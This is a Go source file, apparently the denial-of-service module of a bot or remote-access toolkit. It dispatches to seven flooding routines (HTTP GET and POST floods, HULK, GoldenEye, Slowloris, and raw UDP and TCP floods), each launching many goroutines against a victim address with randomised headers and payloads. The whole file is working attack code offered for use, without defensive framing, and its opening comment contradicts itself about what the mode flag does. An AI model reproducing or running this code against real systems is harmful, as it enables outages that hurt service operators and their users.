//SetDDoSMode(true) = stop attacks
//SetDDoSMode(false) = stop attacks

package utils

import (
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
	"fmt"
)

func DDosAttc(attc string, vic string, threads int, interval int) {
	if attc == "0" { //HTTPGet
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go httpGetAttack(vic, interval)
			}
		}
	} else if attc == "1" { //HULK
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			u, _ := url.Parse(vic)
			for i := 0; i < threads; i++ {
				go hulkAttack(vic, u.Host, interval)
			}
		}
	} else if attc == "2" { //SLOWLORIS
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go slowlorisAttack(vic, interval)
			}
		}
	} else if attc == "3" { //UDP Flood
		if strings.Contains(vic, ":") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go udpAttack(vic, interval)
			}
		}
	} else if attc == "4" { //TCP Flood
		if strings.Contains(vic, ":") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go tcpAttack(vic, interval)
			}
		}
	} else if attc == "5" { //GoldenEye
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go goldenEyeAttack(vic, interval)
			}
		}
	} else if attc == "6" { //HTTPPost
		if strings.Contains(vic, "http://") || strings.Contains(vic, "https://") {
			SetDDoSMode(true)
			for i := 0; i < threads; i++ {
				go postAttack(vic, interval)
			}
		}
	}
}

func httpGetAttack(Target string, interval int) {
	for isDDoS {
		resp, err := http.Get(Target)
		if err != nil	{
			continue
		}
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		closeConnction(resp)
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func postAttack(Target string, interval int) {
	for isDDoS {
		resp, err := http.PostForm(Target, url.Values{"user": {RandomString(5, false)}, "pass": {RandomString(5, false)}, "captcha": {RandomString(5, false)}})
		if err != nil	{
			continue
		}
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		closeConnction(resp)
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func closeConnction(resp *http.Response) {
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
	}
}

func hulkAttack(url string, host string, interval int) {
	var param_joiner string
	var acceptCharset string = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(url, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", url+param_joiner+buildblock(5)+"="+buildblock(3), nil)
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(5))
		q.Header.Set("Keep-Alive", strconv.Itoa(120))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)
		r, err := client.Do(q)
		if err != nil	{
			continue
		}
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		rand.Seed(time.Now().UTC().UnixNano())
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func tcpAttack(vic string, interval int) {
TSTART:
	conn, err := net.Dial("tcp", vic)
	if nil != err {
		goto TSTART
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		conn.Write([]byte(RandomString(2048, true)))
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
	conn.Close()
}

func udpAttack(vic string, interval int) {
USTART:
	RemoteAddr, err := net.ResolveUDPAddr("udp", vic)
	conn, err := net.DialUDP("udp", nil, RemoteAddr)
	if err != nil {
		goto USTART
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		conn.Write([]byte(RandomString(2048, true)))
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
	conn.Close()
}

func goldenEyeAttack(vic string, interval int) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(vic, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", vic, nil)
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", `*,identity,gzip,deflate`)
		q.Header.Set("Accept-Charset", `ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15`)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(20000))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Content-Type", `multipart/form-data, application/x-url-encoded`)
		q.Header.Set("Cookies", RandomString(25, false))
		r, err := client.Do(q)
		if err != nil	{
			continue
		}
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func slowlorisAttack(vic string, interval int) {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
	}
	var client = new(http.Client)
	if strings.Contains(vic, "http://") {
		client = new(http.Client)
	} else {
		client = &http.Client{Transport: tr}
	}
	for isDDoS {
		defer func() {
			if r := recover(); r != nil {
				fmt.Println("ERROR")
			}
		}()
		rand.Seed(time.Now().UTC().UnixNano())
		req, _ := http.NewRequest("GET", vic+RandomString(5, true), nil)
		req.Header.Add("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		req.Header.Add("Content-Length", "42")
		resp, err := client.Do(req)
		if err != nil	{
			continue
		}
		defer resp.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}
